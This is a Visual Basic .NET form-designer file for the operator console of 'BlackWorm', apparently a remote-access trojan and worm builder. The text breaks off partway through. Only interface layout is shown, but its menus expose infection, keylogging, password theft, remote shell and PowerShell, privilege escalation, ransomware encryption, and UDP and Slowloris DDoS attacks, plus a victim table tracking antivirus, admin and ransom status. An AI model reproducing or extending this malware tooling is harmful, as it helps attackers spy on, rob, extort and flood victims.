﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Dim ListViewItem1 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"IP Address : "}, 0, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem2 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"Username : "}, 1, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem3 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"Contery : "}, 2, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem4 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"OS : "}, 3, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem5 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"AntiVirus : "}, 4, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem6 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"Firewall : "}, 5, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem7 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"CPU : "}, 6, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem8 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"GPU : "}, 7, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Dim ListViewItem9 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"RAM : "}, 8, System.Drawing.SystemColors.WindowText, System.Drawing.SystemColors.Window, New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold))
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel4 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel8 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel3 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel5 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel9 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel10 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripDropDownButton1 = New System.Windows.Forms.ToolStripDropDownButton()
        Me.ColorsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BackColorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FontColorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ListViewToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LargeIconsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SmallIconsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ListToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TitleToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GrindLineToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShowToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HideToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripStatusLabel7 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel2 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel6 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.VvvToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.SurveillanceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.IPLocationToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FileManagerToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CommandShellToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemotePowershellToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ProcessManagerToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServiceManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartupManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyloggerToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.PluginsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GetPasswordToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InfectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CoustomPluginToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExecuteScriptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ElevetePrivlageToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RansomwareToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EncryptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DecryptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BlockWebSiteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenWebSiteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DDOSAttackToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.UDPAttackToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.StopToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.SlowlorisAttackToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.StopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ComputerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LogoffToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GroupsSettingsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AddToGroupToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.MultiToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoveFromGroupToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.WormSettingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.TransferToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SingleTransferToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MultiTransferToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MenuStrip1 = New System.Windows.Forms.MenuStrip()
        Me.StartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SendPugToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NoIPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DNSDynmicToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PluginManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.IMG2 = New System.Windows.Forms.ImageList(Me.components)
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Panel3 = New System.Windows.Forms.Panel()
        Me.ContextMenuStrip4 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.CopyDataToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.ContextMenuStrip3 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ClearLogsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Lv1 = New bWorm.LV()
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.L1 = New bWorm.LV()
        Me.hname = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hip = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hmtx = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hpc = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.huser = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hco = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hos = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hcpu = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hav = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hfw = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hvr = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hping = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hac = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hinstall = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hcheck = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hadmin = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hransom = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Logs = New bWorm.LV()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.StatusStrip1.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.MenuStrip1.SuspendLayout()
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.Panel3.SuspendLayout()
        Me.ContextMenuStrip4.SuspendLayout()
        Me.Panel2.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.ContextMenuStrip3.SuspendLayout()
        Me.SuspendLayout()
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.SystemColors.ButtonHighlight
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel4, Me.ToolStripStatusLabel1, Me.ToolStripStatusLabel8, Me.ToolStripStatusLabel3, Me.ToolStripStatusLabel5, Me.ToolStripStatusLabel9, Me.ToolStripStatusLabel10, Me.ToolStripDropDownButton1, Me.ToolStripStatusLabel7, Me.ToolStripStatusLabel2, Me.ToolStripStatusLabel6})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 403)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.ManagerRenderMode
        Me.StatusStrip1.Size = New System.Drawing.Size(798, 22)
        Me.StatusStrip1.TabIndex = 1
        Me.StatusStrip1.Text = "|| "
        '
        'ToolStripStatusLabel4
        '
        Me.ToolStripStatusLabel4.Name = "ToolStripStatusLabel4"
        Me.ToolStripStatusLabel4.Size = New System.Drawing.Size(13, 17)
        Me.ToolStripStatusLabel4.Text = "||"
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.ActiveLinkColor = System.Drawing.Color.DodgerBlue
        Me.ToolStripStatusLabel1.Image = CType(resources.GetObject("ToolStripStatusLabel1.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel1.IsLink = True
        Me.ToolStripStatusLabel1.LinkColor = System.Drawing.Color.Black
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(100, 17)
        Me.ToolStripStatusLabel1.Text = "[ Build WorM ]"
        Me.ToolStripStatusLabel1.VisitedLinkColor = System.Drawing.SystemColors.Highlight
        '
        'ToolStripStatusLabel8
        '
        Me.ToolStripStatusLabel8.Name = "ToolStripStatusLabel8"
        Me.ToolStripStatusLabel8.Size = New System.Drawing.Size(13, 17)
        Me.ToolStripStatusLabel8.Text = "||"
        '
        'ToolStripStatusLabel3
        '
        Me.ToolStripStatusLabel3.Image = CType(resources.GetObject("ToolStripStatusLabel3.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(143, 17)
        Me.ToolStripStatusLabel3.Text = "[ Application Settings ]"
        '
        'ToolStripStatusLabel5
        '
        Me.ToolStripStatusLabel5.Name = "ToolStripStatusLabel5"
        Me.ToolStripStatusLabel5.Size = New System.Drawing.Size(13, 17)
        Me.ToolStripStatusLabel5.Text = "||"
        '
        'ToolStripStatusLabel9
        '
        Me.ToolStripStatusLabel9.Image = CType(resources.GetObject("ToolStripStatusLabel9.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel9.Name = "ToolStripStatusLabel9"
        Me.ToolStripStatusLabel9.Size = New System.Drawing.Size(125, 17)
        Me.ToolStripStatusLabel9.Text = "[ Groups Manager ]"
        '
        'ToolStripStatusLabel10
        '
        Me.ToolStripStatusLabel10.Name = "ToolStripStatusLabel10"
        Me.ToolStripStatusLabel10.Size = New System.Drawing.Size(13, 17)
        Me.ToolStripStatusLabel10.Text = "||"
        '
        'ToolStripDropDownButton1
        '
        Me.ToolStripDropDownButton1.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ColorsToolStripMenuItem, Me.ListViewToolStripMenuItem, Me.GrindLineToolStripMenuItem})
        Me.ToolStripDropDownButton1.Image = CType(resources.GetObject("ToolStripDropDownButton1.Image"), System.Drawing.Image)
        Me.ToolStripDropDownButton1.ImageTransparentColor = System.Drawing.Color.Magenta
        Me.ToolStripDropDownButton1.Name = "ToolStripDropDownButton1"
        Me.ToolStripDropDownButton1.Size = New System.Drawing.Size(121, 20)
        Me.ToolStripDropDownButton1.Text = "[ ListView Style ]"
        '
        'ColorsToolStripMenuItem
        '
        Me.ColorsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.BackColorToolStripMenuItem, Me.FontColorToolStripMenuItem})
        Me.ColorsToolStripMenuItem.Image = CType(resources.GetObject("ColorsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ColorsToolStripMenuItem.Name = "ColorsToolStripMenuItem"
        Me.ColorsToolStripMenuItem.Size = New System.Drawing.Size(118, 22)
        Me.ColorsToolStripMenuItem.Text = "Colors"
        '
        'BackColorToolStripMenuItem
        '
        Me.BackColorToolStripMenuItem.Image = CType(resources.GetObject("BackColorToolStripMenuItem.Image"), System.Drawing.Image)
        Me.BackColorToolStripMenuItem.Name = "BackColorToolStripMenuItem"
        Me.BackColorToolStripMenuItem.Size = New System.Drawing.Size(131, 22)
        Me.BackColorToolStripMenuItem.Text = "Back Color"
        '
        'FontColorToolStripMenuItem
        '
        Me.FontColorToolStripMenuItem.Image = CType(resources.GetObject("FontColorToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FontColorToolStripMenuItem.Name = "FontColorToolStripMenuItem"
        Me.FontColorToolStripMenuItem.Size = New System.Drawing.Size(131, 22)
        Me.FontColorToolStripMenuItem.Text = "Font Color"
        '
        'ListViewToolStripMenuItem
        '
        Me.ListViewToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LargeIconsToolStripMenuItem, Me.SmallIconsToolStripMenuItem, Me.DToolStripMenuItem, Me.ListToolStripMenuItem, Me.TitleToolStripMenuItem})
        Me.ListViewToolStripMenuItem.Image = CType(resources.GetObject("ListViewToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ListViewToolStripMenuItem.Name = "ListViewToolStripMenuItem"
        Me.ListViewToolStripMenuItem.Size = New System.Drawing.Size(118, 22)
        Me.ListViewToolStripMenuItem.Text = "View"
        '
        'LargeIconsToolStripMenuItem
        '
        Me.LargeIconsToolStripMenuItem.Image = CType(resources.GetObject("LargeIconsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.LargeIconsToolStripMenuItem.Name = "LargeIconsToolStripMenuItem"
        Me.LargeIconsToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.LargeIconsToolStripMenuItem.Text = "Large Icons"
        '
        'SmallIconsToolStripMenuItem
        '
        Me.SmallIconsToolStripMenuItem.Image = CType(resources.GetObject("SmallIconsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SmallIconsToolStripMenuItem.Name = "SmallIconsToolStripMenuItem"
        Me.SmallIconsToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.SmallIconsToolStripMenuItem.Text = "Small Icons"
        '
        'DToolStripMenuItem
        '
        Me.DToolStripMenuItem.Image = CType(resources.GetObject("DToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DToolStripMenuItem.Name = "DToolStripMenuItem"
        Me.DToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.DToolStripMenuItem.Text = "Details"
        '
        'ListToolStripMenuItem
        '
        Me.ListToolStripMenuItem.Image = CType(resources.GetObject("ListToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ListToolStripMenuItem.Name = "ListToolStripMenuItem"
        Me.ListToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.ListToolStripMenuItem.Text = "List"
        '
        'TitleToolStripMenuItem
        '
        Me.TitleToolStripMenuItem.Image = CType(resources.GetObject("TitleToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TitleToolStripMenuItem.Name = "TitleToolStripMenuItem"
        Me.TitleToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.TitleToolStripMenuItem.Text = "Tile"
        '
        'GrindLineToolStripMenuItem
        '
        Me.GrindLineToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ShowToolStripMenuItem, Me.HideToolStripMenuItem})
        Me.GrindLineToolStripMenuItem.Image = CType(resources.GetObject("GrindLineToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GrindLineToolStripMenuItem.Name = "GrindLineToolStripMenuItem"
        Me.GrindLineToolStripMenuItem.Size = New System.Drawing.Size(118, 22)
        Me.GrindLineToolStripMenuItem.Text = "GridLine"
        '
        'ShowToolStripMenuItem
        '
        Me.ShowToolStripMenuItem.Image = CType(resources.GetObject("ShowToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem"
        Me.ShowToolStripMenuItem.Size = New System.Drawing.Size(103, 22)
        Me.ShowToolStripMenuItem.Text = "Show"
        '
        'HideToolStripMenuItem
        '
        Me.HideToolStripMenuItem.Image = CType(resources.GetObject("HideToolStripMenuItem.Image"), System.Drawing.Image)
        Me.HideToolStripMenuItem.Name = "HideToolStripMenuItem"
        Me.HideToolStripMenuItem.Size = New System.Drawing.Size(103, 22)
        Me.HideToolStripMenuItem.Text = "Hide"
        '
        'ToolStripStatusLabel7
        '
        Me.ToolStripStatusLabel7.Name = "ToolStripStatusLabel7"
        Me.ToolStripStatusLabel7.Size = New System.Drawing.Size(13, 17)
        Me.ToolStripStatusLabel7.Text = "||"
        '
        'ToolStripStatusLabel2
        '
        Me.ToolStripStatusLabel2.Image = CType(resources.GetObject("ToolStripStatusLabel2.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2"
        Me.ToolStripStatusLabel2.Size = New System.Drawing.Size(134, 17)
        Me.ToolStripStatusLabel2.Text = "[ About BlackWorm ]"
        '
        'ToolStripStatusLabel6
        '
        Me.ToolStripStatusLabel6.Name = "ToolStripStatusLabel6"
        Me.ToolStripStatusLabel6.Size = New System.Drawing.Size(0, 17)
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(32, 19)
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(6, 6)
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'Timer2
        '
        Me.Timer2.Enabled = True
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.VvvToolStripMenuItem, Me.SurveillanceToolStripMenuItem, Me.PluginsToolStripMenuItem, Me.ExecuteScriptToolStripMenuItem, Me.ElevetePrivlageToolStripMenuItem, Me.RansomwareToolStripMenuItem, Me.BlockWebSiteToolStripMenuItem, Me.OpenWebSiteToolStripMenuItem, Me.DDOSAttackToolStripMenuItem1, Me.ComputerToolStripMenuItem, Me.GroupsSettingsToolStripMenuItem, Me.WormSettingToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(165, 268)
        '
        'VvvToolStripMenuItem
        '
        Me.VvvToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem1, Me.FromURLToolStripMenuItem1})
        Me.VvvToolStripMenuItem.Image = CType(resources.GetObject("VvvToolStripMenuItem.Image"), System.Drawing.Image)
        Me.VvvToolStripMenuItem.Name = "VvvToolStripMenuItem"
        Me.VvvToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.VvvToolStripMenuItem.Text = "Run File"
        '
        'FromDiskToolStripMenuItem1
        '
        Me.FromDiskToolStripMenuItem1.Image = CType(resources.GetObject("FromDiskToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromDiskToolStripMenuItem1.Name = "FromDiskToolStripMenuItem1"
        Me.FromDiskToolStripMenuItem1.Size = New System.Drawing.Size(127, 22)
        Me.FromDiskToolStripMenuItem1.Text = "From Disk"
        '
        'FromURLToolStripMenuItem1
        '
        Me.FromURLToolStripMenuItem1.Image = CType(resources.GetObject("FromURLToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(127, 22)
        Me.FromURLToolStripMenuItem1.Text = "From URL"
        '
        'SurveillanceToolStripMenuItem
        '
        Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.IPLocationToolStripMenuItem1, Me.FileManagerToolStripMenuItem1, Me.CommandShellToolStripMenuItem1, Me.RemotePowershellToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem1, Me.ProcessManagerToolStripMenuItem1, Me.ServiceManagerToolStripMenuItem, Me.StartupManagerToolStripMenuItem, Me.KeyloggerToolStripMenuItem1})
        Me.SurveillanceToolStripMenuItem.Image = CType(resources.GetObject("SurveillanceToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
        Me.SurveillanceToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
        '
        'IPLocationToolStripMenuItem1
        '
        Me.IPLocationToolStripMenuItem1.Image = CType(resources.GetObject("IPLocationToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.IPLocationToolStripMenuItem1.Name = "IPLocationToolStripMenuItem1"
        Me.IPLocationToolStripMenuItem1.Size = New System.Drawing.Size(179, 22)
        Me.IPLocationToolStripMenuItem1.Text = "IP Location"
        '
        'FileManagerToolStripMenuItem1
        '
        Me.FileManagerToolStripMenuItem1.Image = CType(resources.GetObject("FileManagerToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1"
        Me.FileManagerToolStripMenuItem1.Size = New System.Drawing.Size(179, 22)
        Me.FileManagerToolStripMenuItem1.Text = "File Manager"
        '
        'CommandShellToolStripMenuItem1
        '
        Me.CommandShellToolStripMenuItem1.Image = CType(resources.GetObject("CommandShellToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.CommandShellToolStripMenuItem1.Name = "CommandShellToolStripMenuItem1"
        Me.CommandShellToolStripMenuItem1.Size = New System.Drawing.Size(179, 22)
        Me.CommandShellToolStripMenuItem1.Text = "Command Shell"
        '
        'RemotePowershellToolStripMenuItem
        '
        Me.RemotePowershellToolStripMenuItem.Image = CType(resources.GetObject("RemotePowershellToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemotePowershellToolStripMenuItem.Name = "RemotePowershellToolStripMenuItem"
        Me.RemotePowershellToolStripMenuItem.Size = New System.Drawing.Size(179, 22)
        Me.RemotePowershellToolStripMenuItem.Text = "Windows Poweshell"
        '
        'RemoteDesktopToolStripMenuItem1
        '
        Me.RemoteDesktopToolStripMenuItem1.Image = CType(resources.GetObject("RemoteDesktopToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.RemoteDesktopToolStripMenuItem1.Name = "RemoteDesktopToolStripMenuItem1"
        Me.RemoteDesktopToolStripMenuItem1.Size = New System.Drawing.Size(179, 22)
        Me.RemoteDesktopToolStripMenuItem1.Text = "Remote Desktop"
        '
        'ProcessManagerToolStripMenuItem1
        '
        Me.ProcessManagerToolStripMenuItem1.Image = CType(resources.GetObject("ProcessManagerToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.ProcessManagerToolStripMenuItem1.Name = "ProcessManagerToolStripMenuItem1"
        Me.ProcessManagerToolStripMenuItem1.Size = New System.Drawing.Size(179, 22)
        Me.ProcessManagerToolStripMenuItem1.Text = "Process Manager"
        '
        'ServiceManagerToolStripMenuItem
        '
        Me.ServiceManagerToolStripMenuItem.Image = CType(resources.GetObject("ServiceManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServiceManagerToolStripMenuItem.Name = "ServiceManagerToolStripMenuItem"
        Me.ServiceManagerToolStripMenuItem.Size = New System.Drawing.Size(179, 22)
        Me.ServiceManagerToolStripMenuItem.Text = "Service Manager"
        '
        'StartupManagerToolStripMenuItem
